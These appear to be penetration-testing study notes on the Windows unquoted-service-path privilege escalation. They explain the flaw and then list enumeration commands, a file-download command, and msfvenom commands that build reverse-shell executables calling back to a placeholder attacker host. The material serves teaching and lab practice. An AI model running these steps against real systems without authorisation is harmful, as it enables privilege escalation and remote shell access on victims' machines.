##################################################
# Presentation.

#The UnquotedServicePath hijack is a Windows PrivEsc vector in which we leverage a malconfiguration Windows feature related to unquoted binpath strings. 

#The OS, in order to init a service must run the executable binary associated with it. If the binpath var, that stores the path to the service's binary, doesn't have quotes the system would interpret the string as a command with arguments delimitated by spaces.

#This means that if we have the following var:

#	binPath=C:\Program Files\My Program\My service\service.exe

#The system will try to execute the following executables: C:\Program.exe, C:\Program FIles\My.exe and finally C:\Program Files\My Program\My service\service.exe. So if we could store in one of those locations our malicious payload, we could have at the restart of the service, code execution through an adminstrative account resulting in a privilege escalation.

######################################################################
#Enumeration.

Get-CimInstance -ClassName win32_service | Select Name,State,PathName <--- List Name,State,Paths of services.

wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """ #<--- Displays unquoted bin paths from services."

Start/Restart/Stop-Service

icacls "<BINPATH>" #<--- Check permissions of icacls.

iwr -uri <URI> -Outfile <PATHFILE>.exe <-- Transfer file

#PowerUp's Invoke-Allchecks cmdlet displays Unquoted Path services.

###########################################################################
#Leading the attack.

#Once we find a unquoted service path that give us a satisfactory location to write pur payload and know how to trigger the start/restart of the service we can make our payload with msfvenom:

msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe

msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
